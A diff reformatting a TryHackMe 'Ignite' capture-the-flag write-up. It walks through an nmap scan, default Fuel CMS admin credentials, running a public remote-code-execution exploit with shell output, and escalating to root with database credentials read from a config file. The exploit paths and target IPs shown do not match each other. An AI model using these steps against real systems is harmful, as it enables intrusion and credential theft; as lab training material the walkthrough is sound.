@@ -1,4 +1,9 @@
-first start the machine and start with a basic nmap scan to find what's running 
+# TryHackMe: Ignite
+
+## Initial Enumeration
+
+First, let's start with a basic Nmap scan to discover open ports and services:
+
 ```bash
 nmap -A -p- -T4 10.48.144.132
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 10:48 +06
@@ -10,11 +15,23 @@ PORT   STATE SERVICE VERSION
 | http-robots.txt: 1 disallowed entry
 |_/fuel/
 ```
-only port 80 open.
-visiting the port 80 provides a default installation page of fuel cms along with version number 1.4
-At the bottom of the page we find the url of admin panel also with default creds and luckily those creds haven't been changed and working
-Now we have the admin panel access
-I found nothing interesting there, so I searched for vulnerabilities of fuel cms 1.4
+
+### Key Findings:
+- Only port 80 is open (HTTP)
+- Apache 2.4.18 web server
+- Discovered `/fuel/` in robots.txt
+
+## Web Enumeration
+
+Upon visiting port 80, we discovered:
+- Default installation page of Fuel CMS (version 1.4)
+- Admin panel URL with default credentials
+- Successfully logged in with default credentials (unchanged)
+
+## Vulnerability Assessment
+
+Searching for known vulnerabilities in Fuel CMS 1.4:
+
 ```bash
 searchsploit fuel CMS 1.4
 -------------------------------------------------------------------------------------- ---------------------------------
@@ -28,32 +45,34 @@ Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                            
 Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                      | php/webapps/48778.txt
 -------------------------------------------------------------------------------------- ---------------------------------
 ```
-We have RCE exploit.
 
-Let's exploit it. First we need to find this exploit path for execute
+### Locating the Exploit
+
 ```bash
 searchsploit -p 47138
   Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
       URL: https://www.exploit-db.com/exploits/47138
      Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
     Codes: CVE-2018-16763
- Verified: False
-File Type: Python script, ASCII text executable
-Copied EDB-ID #47138's path to the clipboard
 ```
-We have the path, now execute:
+
+## Initial Access
+
+Testing the RCE exploit:
+
 ```bash
 python3 /usr/share/exploitdb/exploits/php/webapps/50477.py --url http://10.10.160.108/
 [+]Connecting...
 Enter Command $id
 systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-we have the server access and you'll get an issue in it.
-The issue you'll experience is that each command runs independently and doesn't maintain state between commands. For example, cd won't work
+
+### Note on Command Execution
+The initial exploit has a limitation where commands run independently and don't maintain state. For example:
+
 ```bash
 Enter Command $pwd
 system/var/www/html
-
 
 Enter Command $cd /home
 system
@@ -61,15 +80,16 @@ system
 Enter Command $pwd
 system/var/www/html
 ```
-So I made a solution, a custom exploit script(a modified version of this exploit)
-Download the script and run it
-then navigate to the /home/www-data/ folder for the user flag
 
-Now it's privilege escalation time:
-I ran linpeas on the target and got an interesting file to look at
-/var/www/html/fuel/application/config/database.php
-Upon opening we got the creds
-```bash
+To overcome this limitation, a custom modified version of the exploit was created.
+
+## Privilege Escalation
+
+1. Ran LinPEAS for system enumeration
+2. Found interesting configuration file: `/var/www/html/fuel/application/config/database.php`
+3. Retrieved database credentials from the config file:
+
+```php
 $db['default'] = array(
         'dsn'   => '',
         'hostname' => 'localhost',
@@ -90,5 +110,12 @@ $db['default'] = array(
         'stricton' => FALSE,
         'failover' => array(),
         'save_queries' => TRUE
+)
 ```
-Use the pass for switching to root and read the root flag.
+
+### Root Access
+Successfully switched to root using the discovered password and accessed the root flag.
+
+## Flags
+- User flag location: `/home/www-data/`
+- Root flag: Accessible after privilege escalation
